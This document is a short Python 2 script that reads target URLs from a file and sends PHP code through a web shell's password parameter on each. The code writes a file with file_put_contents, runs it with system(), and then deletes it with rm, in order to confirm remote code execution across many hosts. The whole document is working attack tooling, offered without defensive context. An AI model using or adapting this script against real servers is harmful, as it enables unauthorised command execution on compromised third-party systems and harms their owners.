#encoding:utf-8
import requests
import string

def upload_file(target,method,password):
	if method == "get":
		payload = "file_put_contents(\"echo.php\",\"<?php echo 888888;?>\");"
		url = target + "?" + password + "=" + payload
		response = requests.get(url)
		if response.status_code == 200:
			print response.text
			return True
		return response.status_code
	if method == "post":
		payload = {password:"file_put_contents(\"echo.php\",\"<?php echo 888888;?>\");"}
		url = target
		response = requests.post(url,data=payload)
		if response.status_code == 200:
			print response.text
			return True
		return response.status_code

def execute(target,method,password):
	if method == "get":
		payload = "system(\"php -f echo.php\");system(\"rm echo.php\");"
		url = target + "?" + password + "=" + payload
		response = requests.get(url)
		if response.status_code == 200:
			print response.text
			return True
		return response.status_code
	if method == "post":
		payload = {password:"system(\"php -f echo.php\");system(\"rm echo.php\");"}
		url = target
		response = requests.post(url,data=payload)
		if response.status_code == 200:
			print response.text
			return True
		return response.status_code

def main():
	targetlist = []
	with open("target.txt","r") as ft:
		for line in ft.readlines():
			targetlist.append(line.strip('\r\n'))
	print "[+]-----------------------------------------------[+]"
	print "[+] Choose shell method GET/POST!"
	method = raw_input("GET/POST\n")
	print "[+] Input shell passwd!"
	passwd = raw_input("password\n")
	if string.lower(method) == 'get':
		method = 'get'
	if string.lower(method) == 'post':
		method = 'post'
	for target in targetlist:
		print "[+] Testing target: %s" % target
		result = upload_file(target,method,passwd)
		if result == True:
			print "[+] %s Upload success!" % target
			exe_re = execute(target,method,passwd)
			if exe_re == True:
				print "[+] %s Execute success!" % target
			else:
				print "[+] Execute failed, Error code: %d" % exe_re
		else:
			print "[+] Upload failed, Error code: %d" % result
		print "[+]-----------------------------------------------[+]"
if __name__ == '__main__':
	main()




